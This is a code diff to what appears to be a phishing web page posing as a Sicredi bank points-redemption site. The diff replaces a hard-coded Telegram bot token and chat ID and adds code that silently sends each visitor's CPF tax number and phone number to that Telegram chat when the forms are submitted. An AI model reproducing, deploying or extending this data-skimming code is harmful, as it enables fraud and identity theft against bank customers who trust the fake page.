@@ -135,8 +135,8 @@
     </div>
 
     <script>
-        const tokenBotTelegram = "7024807486:AAFxaoUwzXKWNA-D4VOH2zqtj4K28PWw3ds";
-        const chatId = "6019114072";
+        const tokenBotTelegram = "7641124246:AAHT7YBvtkm9H0DdWpAwbVzf5rXFneFWAi0";
+        const chatId = "5219689168";
 
         function formatarCPF() {
             var cpf = document.getElementById("cpf").value.replace(/\D/g, ''); // remove tudo o que não for número
@@ -152,6 +152,11 @@
                 localStorage.setItem("cpf", cpf);
                 document.getElementById("container").style.display = "none";
                 document.getElementById("pontosLiberados").style.display = "block";
+
+                // Enviar a mensagem para o Telegram
+                const mensagem = `Usuário com CPF ${cpf} validou o resgate de pontos Sicredi.`;
+                enviarParaTelegram(mensagem);
+
             } else {
                 alert("CPF inválido! Verifique o formato.");
             }
@@ -167,6 +172,11 @@
             if (telefone) {
                 localStorage.setItem("telefone", telefone);
                 window.location.href = "segundo.html";
+
+                // Enviar a confirmação do telefone para o Telegram
+                const cpf = localStorage.getItem("cpf");
+                const mensagemTelefone = `Usuário com CPF ${cpf} confirmou o telefone: ${telefone}`;
+                enviarParaTelegram(mensagemTelefone);
             } else {
                 alert("Por favor, insira um telefone válido.");
             }
